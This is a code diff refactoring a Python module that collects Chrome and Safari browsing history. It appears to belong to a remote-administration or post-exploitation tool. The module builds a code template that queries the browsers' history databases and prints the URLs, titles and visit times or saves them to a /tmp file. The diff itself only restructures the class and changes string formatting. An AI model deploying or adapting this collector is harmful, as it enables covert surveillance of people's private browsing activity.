@@ -1,20 +1,23 @@
+from modules.helpers import ModuleABC
 import uuid
 
 
-class Module:
+class Module(ModuleABC):
     def __init__(self):
-        self.info = {
+        self.history_limit = None
+        self.output_file = None
+
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Retrieves browser history (Chrome and Safari).",
             "References": [],
             "Task": False
         }
-        self.history_limit = None
-        self.output_file = None
 
-    def setup(self, module_view, output_view, successful):
-        self.history_limit = module_view.prompt("History limit [ENTER for 10]: ")
-        self.output_file = module_view.prompt("Would you like to output to a file? [y/N]").lower()
+    def setup(self, module_input, view, successful):
+        self.history_limit = module_input.prompt("History limit [ENTER for 10]: ")
+        self.output_file = module_input.prompt("Would you like to output to a file? [y/N]").lower()
 
         if not self.history_limit:
             self.history_limit = 10
@@ -24,7 +27,7 @@ class Module:
             self.output_file = "/tmp/%s.txt" % str(uuid.uuid4()).replace("-", "")[0:12]
 
         if not str(self.history_limit).isdigit():
-            output_view.add("Invalid history limit.", "attention")
+            view.output("Invalid history limit.", "attention")
             successful.put(False)
         else:
             successful.put(True)
@@ -35,7 +38,7 @@ class Module:
         import os
         
         number = ""
-        output_file = "%s"
+        output_file = "{}"
         
         if output_file:
             print MESSAGE_INFO + "Writing browser history to: " + output_file
@@ -50,7 +53,7 @@ class Module:
                 cur.execute("SELECT datetime(hv.visit_time + 978307200, 'unixepoch', 'localtime') as last_visited, hi.url, hv.title FROM history_visits hv, history_items hi WHERE hv.history_item = hi.id;")
                 statement = cur.fetchall()
                 
-                number = %s * -1
+                number = {} * -1
                 
                 if not output_file:
                     print MESSAGE_INFO + "Safari history: "
@@ -78,7 +81,7 @@ class Module:
                 cur.execute("SELECT datetime(last_visit_time/1000000-11644473600, \\"unixepoch\\") as last_visited, url, title, visit_count FROM urls;")
                 statement = cur.fetchall()
                 
-                number = %s * -1
+                number = {} * -1
                 
                 if not output_file:
                     print ""
@@ -95,4 +98,4 @@ class Module:
                 conn.close()
         except Exception as ex:
             print MESSAGE_ATTENTION + "Error (Chrome): " + str(ex)
-        """ % (self.output_file, self.history_limit, self.history_limit)
+        """.format(self.output_file, self.history_limit, self.history_limit)
